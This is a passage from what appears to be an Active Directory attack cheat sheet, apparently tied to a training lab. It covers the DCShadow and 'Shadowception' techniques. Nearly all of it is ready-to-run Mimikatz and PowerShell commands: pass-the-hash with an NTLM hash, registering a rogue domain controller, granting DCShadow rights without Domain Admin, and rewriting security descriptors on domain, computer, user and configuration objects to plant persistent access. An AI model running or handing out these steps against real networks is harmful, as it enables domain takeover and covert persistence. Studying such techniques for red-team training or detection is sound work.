11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-45138)

- Mimikatz2 (Push - Needs Domain Admin or similar)
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /impersonate
mimikatz # lsadump::dcshadow /push        # Need Domain Admin
OR
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /run:powershell.exe"'
PS C:\> Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose        # To use without Domain Admin
- Mimikatz2 (Push - Can be run as student1) (right-click -> Run as administrator)
mimikatz # lsadump::dcshadow /push        # Do not need Domain Admin
```

### Shadowception

- Get the Security Descriptor Definition Language (SDDL) of an object

```
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=domain,DC=local")).psbase.ObjectSecurity.sddl
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=domain,DC=local")).psbase.ObjectSecurity.sddl | Set-Clipboard        # Copy to clipboard
```

- Shadowception walkthrough

```
Get the Security Descriptor Definition Language (SDDL) of the domain object
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=domain,DC=local")).psbase.ObjectSecurity.sddl

Append the 3 domain object ACE values from above with our user's SID at the end
mimikatz # lsadump::dcshadow /stack /object:DC=domain,DC=local /attribute:ntSecurityDescriptor /value:<modified ACL>        # /stack means you will only need to /push one time to perform all the stucked changes in the rogue server

Get the Security Descriptor Definition Language (SDDL) of the attacker computer object
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=mcorp-student13,CN=Computers,DC=domain,DC=local")).psbase.ObjectSecurity.sddl

Append the write property on the attacker computer object ACE values from above with our user's SID at the end
mimikatz # lsadump::dcshadow /stack /object:mcorp-student13 /attribute:ntSecurityDescriptor /value:<modified ACL>        # /stack means you will only need to /push one time to perform all the stucked changes in the rogue server

Get the Security Descriptor Definition Language (SDDL) of the target user object
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=mcorp-root13user,CN=Users,DC=domain,DC=local")).psbase.ObjectSecurity.sddl

Append the write property on the target user object ACE values from above with our user's SID at the end
mimikatz # lsadump::dcshadow /stack /object:root13user /attribute:ntSecurityDescriptor /value:<modified ACL>        # /stack means you will only need to /push one time to perform all the stucked changes in the rogue server

Get the Security Descriptor Definition Language (SDDL) of the Sites object in the Configuration container
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Sites,CN=Configuration,DC=domain,DC=local")).psbase.ObjectSecurity.sddl

Append the write property on the Sites object in the Configuration container ACE values from above with our user's SID at the end
mimikatz # lsadump::dcshadow /stack /object:CN=Sites,CN=Configuration,DC=domain,DC=local /attribute:ntSecurityDescriptor /value:<modified ACL>        # /stack means you will only need to /push one time to perform all the stucked changes in the rogue server

mimikatz # lsadump::dcshadow

mimikatz # lsadump::dcshadow /push
```
